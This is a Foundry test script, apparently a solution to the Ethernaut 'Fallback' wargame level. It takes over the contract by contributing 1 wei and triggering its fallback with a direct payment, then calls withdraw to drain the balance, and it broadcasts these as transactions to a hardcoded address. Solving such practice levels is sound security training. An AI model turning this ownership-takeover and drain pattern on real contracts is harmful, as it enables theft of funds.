// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level1.sol";

contract POC is Test {
    Fallback level1 = Fallback(0xD0d68E770C540981DC089492021cE3117AB3253F);

    function test() public {
        vm.startBroadcast();

        level1.contribute{value: 1 wei}();
        (bool success, ) = address(level1).call{value: 1 wei}("");
        require(success);
        level1.withdraw();
        require(address(level1).balance == 0);

        vm.stopBroadcast();
    }
}
